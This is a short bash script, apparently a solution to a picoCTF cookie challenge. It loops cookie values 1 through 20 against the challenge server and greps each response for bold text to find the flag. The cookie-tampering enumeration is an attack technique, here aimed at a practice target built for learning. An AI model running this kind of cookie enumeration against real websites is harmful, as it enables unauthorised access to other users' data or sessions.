#!/bin/bash

for i in {1..20}
do
  curl -X GET -H "Cookie: name=$i" http://mercury.picoctf.net:21485/check | grep "<b>"
done
